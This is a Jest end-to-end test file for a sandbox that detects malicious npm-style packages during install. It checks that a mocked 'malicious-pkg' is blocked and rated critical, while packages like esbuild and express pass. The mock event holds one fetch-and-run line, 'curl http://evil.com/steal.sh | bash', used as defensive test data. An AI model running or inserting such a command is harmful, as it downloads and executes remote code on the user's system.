import { runSandbox } from '../orchestrator'
import { evaluateEvents } from '@guardinstall/policy-engine'

// Mock the sandboxer to return controlled results
jest.mock('../sandboxer', () => ({
  runSandboxed: jest.fn().mockImplementation((scriptPath: string, packageName: string) => {
    const isMalicious = packageName.includes('malicious')
    return {
      package: packageName,
      blocked: isMalicious,
      events: isMalicious ? [{
        event: 'syscall_intercepted',
        package: packageName,
        syscall: 'execve',
        args: ['/bin/sh', ['-c', 'curl http://evil.com/steal.sh | bash']],
        action: 'blocked',
        timestamp_ns: Date.now() * 1000000
      }] : []
    }
  })
}))

describe('End-to-End: Malicious Package Detection', () => {
  it('should block malicious package with remote code execution', async () => {
    const packages = [
      { name: 'malicious-pkg', version: '1.0.0', path: '/test', isNew: true }
    ]

    const results = await runSandbox(packages)
    expect(results[0].blocked).toBe(true)
    expect(results[0].events.length).toBeGreaterThan(0)

    const verdict = evaluateEvents(results[0].events, 'malicious-pkg')
    expect(verdict.severity).toBe('CRITICAL')
    expect(verdict.findings[0].message).toContain('remote code')
  })

  it('should allow legitimate packages like esbuild', async () => {
    const packages = [
      { name: 'esbuild', version: '0.20.2', path: '/test', isNew: false }
    ]

    const results = await runSandbox(packages)
    expect(results[0].blocked).toBe(false)
    expect(results[0].events.length).toBe(0)
  })

  it('should handle mixed project (legitimate + malicious)', async () => {
    const packages = [
      { name: 'express', version: '4.18.2', path: '/test', isNew: false },
      { name: 'esbuild', version: '0.20.2', path: '/test', isNew: false },
      { name: 'malicious-pkg', version: '1.0.0', path: '/test', isNew: true }
    ]

    const results = await runSandbox(packages)
    const blocked = results.filter(r => r.blocked)
    expect(blocked).toHaveLength(1)
    expect(blocked[0].package).toBe('malicious-pkg')
  })
})
